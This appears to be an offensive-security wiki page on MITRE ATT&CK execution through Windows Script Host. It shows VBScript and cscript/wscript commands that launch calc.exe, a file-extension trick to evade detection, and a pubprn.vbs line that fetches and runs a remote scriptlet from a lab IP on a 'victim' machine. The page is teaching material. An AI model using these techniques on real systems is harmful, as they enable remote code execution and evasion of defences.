---
description: MITRE ATT&CK™ Technique TA0002
---
# Windows Scripting Host (WSH)

## Theory

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system. It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe.

## Practice


{% tabs %}

{% tab title="Basic Usage" %}
let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).

```bash
#openCalc.vbs
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

We can now execute the vbs script on the target machine
```bash
cscript.exe c:\Users\Veresk\Desktop\openCalc.vbs
wscript.exe c:\Users\Veresk\Desktop\openCalc.vbs
```

{% hint style="success" %}
A nice trick !
{% endhint %}
A trick is to change the .vbs extension by a randomly choosen one.
```bash
wscript.exe /e:VBScript c:\Users\Veresk\Desktop\openCalc.odt
```
{% endtab %}

{% tab title="pubprn.vbs" %}

Using [pubprn.vbs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753116(v=ws.11)), we will execute code to launch calc.exe. First of, the xml that will be executed by the script:

```bash
#http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"   
	>
</registration>

<script language="JScript">
<![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
]]>
</script>

</scriptlet>
```
On the victime computer:
```bash
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
```


{% endtab %}

{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/weaponization" %}
